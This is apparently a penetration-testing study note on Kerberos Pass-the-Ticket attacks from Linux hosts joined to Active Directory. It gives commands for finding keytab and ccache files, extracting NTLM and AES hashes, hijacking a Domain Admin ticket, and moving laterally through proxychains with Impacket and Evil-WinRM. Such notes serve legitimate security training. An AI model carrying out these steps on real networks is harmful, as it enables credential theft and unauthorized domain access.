# Linux Pass the Ticket (PtT) from Linux

Linux systems integrated with Active Directory (AD) use **Kerberos** for centralized identity management. If a Linux machine is compromised, attackers can locate and abuse Kerberos tickets to impersonate users and escalate privileges across the network.

## 1. Identification: Domain Integration

Before attempting PtT, confirm the Linux host is integrated with AD.

### Domain Join Verification

Use these methods to identify if the machine is a domain member and which users are permitted access.

|Tool|Command|Purpose|
|:--|:--|:--|
|**realm**|`realm list`|Lists domain configuration, permitted groups, and required packages.|
|**ps**|`ps -ef \|grep -e "sssd" -e "winbind"`|

## 2. Locating Kerberos Assets

Kerberos credentials on Linux are typically stored in two formats: **ccache files** (memory-backed/temporary) and **keytab files** (persistent/file-backed).

### Finding Keytab Files

**Keytabs** contain principal names and encrypted keys (derived from passwords), allowing scripts to authenticate without human interaction.

1. **Search the filesystem:** Administrators often use the `.keytab` extension, though it is not mandatory.
    
    ```
    find / -name "*keytab*" -ls 2>/dev/null
    ```
    
2. **Check Cronjobs:** Scripts using Kerberos may reference keytabs with arbitrary extensions.
    
    ```
    crontab -l
    cat /home/<USERNAME>/.scripts/<SCRIPT_NAME>.sh
    ```
    
    - **Note:** Look for the `kinit` command within scripts, as it indicates Kerberos authentication is being used to request a TGT.

### Finding Credential Cache (ccache) Files

**ccache files** hold valid Kerberos credentials for the duration of a user session.

1. **Check Environment Variables:** The `KRB5CCNAME` variable identifies the current session's ticket location.
    
    ```
    env | grep -i krb5
    ```
    
2. **Standard Directory:** These files are most commonly stored in `/tmp`.
    
    ```
    ls -la /tmp/krb5cc_*
    ```
    
    - **Access Requirement:** You must have **root** or elevated privileges to read ccache files belonging to other users.

## 3. Abusing Keytab Files

Keytabs allow for user impersonation or credential extraction.

### Technique A: User Impersonation (`kinit`)

Use this when you have a keytab and want to interact with network resources (e.g., SMB shares) as that user.

1. **Identify the Principal:** Determine which user the keytab belongs to.
    
    ```
    klist -k -t /<PATH_TO_FILE>/<FILENAME>.keytab
    ```
    
2. **Import the Ticket:** Use `kinit` to request a TGT using the keytab.
    
    ```
    # kinit is case-sensitive: <USERNAME> is often lowercase, <DOMAIN> is uppercase
    kinit <USERNAME>@<DOMAIN> -k -t /<PATH_TO_FILE>/<FILENAME>.keytab
    ```
    
3. **Verify:** Check the active ticket in your session.
    
    ```
    klist
    ```
    

### Technique B: Credential Extraction

Use this when you need the user's **NTLM** or **AES** hash for local login, cracking, or Pass-the-Hash.

|Action|Command|
|:--|:--|
|**Extract Hashes**|`python3 /opt/keytabextract.py /<PATH_TO_FILE>/<FILENAME>.keytab`|
|**Credential Types**|Extracts NTLM, AES-256, and AES-128 hashes from 502-type keytabs.|

## 4. Abusing ccache Files

If you obtain **root** access, you can hijack any active user session by utilizing their ccache file.

### Workflow: ccache Hijacking

1. **Identify Target:** Locate a valid ccache file in `/tmp` for a high-privileged user (e.g., a **Domain Admin**).
2. **Set Environment:** Copy the target ticket and point the `KRB5CCNAME` variable to it.
    
    ```
    cp /tmp/krb5cc_<TARGET_ID> /root/ticket.ccache
    export KRB5CCNAME=/root/ticket.ccache
    ```
    
3. **Execution:** Access network resources as the hijacked user.
    
    ```
    smbclient //<TARGET_HOSTNAME>/C$ -k -no-pass -c ls
    ```
    

## 5. Remote Attack Tools & Pivoting

When attacking from an external machine (e.g., `<ATTACK_IP>`), you must proxy traffic and configure local Kerberos settings to use captured tickets.

### Operational Workflow: Remote PtT

1. **Resolution:** Map the domain and target hostnames in `/etc/hosts`.
2. **Tunneling:** Use a tool like **Chisel** to create a SOCKS proxy to the internal network.
3. **Configure Authentication:**
    - **Impacket:** Set `KRB5CCNAME` to the captured ccache and use the `-k` and `-no-pass` flags.
        
        ```
        proxychains impacket-wmiexec <TARGET_HOSTNAME> -k
        ```
        
    - **Evil-WinRM:** Install `krb5-user`, configure `/etc/krb5.conf` with the domain and KDC, and use Kerberos flags.
        
        ```
        proxychains evil-winrm -i <TARGET_HOSTNAME> -r <DOMAIN>
        ```
        

## 6. Command Reference

|Command|Goal|Why it Matters|
|:--|:--|:--|
|`impacket-ticketConverter <INPUT> <OUTPUT>`|Convert tickets between `.ccache` (Linux) and `.kirbi` (Windows).|Essential for moving captured Linux tickets to Windows tools like Rubeus.|
|`linikatz.sh`|Automated credential dumping on Linux.|Mimikatz-like functionality; extracts tickets from SSSD, Samba, and Kerberos implementations.|
|`Rubeus.exe ptt /ticket:<FILE>.kirbi`|Import converted ticket on Windows.|Unlocks access to domain resources from a Windows pivot host.|

### Dangerous Configurations

|Setting|Implication|
|:--|:--|
|**Root Access**|Allows reading any user's ccache file in `/tmp` or the default machine keytab at `/etc/krb5.keytab`.|
|**World-Readable Keytabs**|Enables any local user to impersonate the principal or extract hashes via `keytabextract.py`.|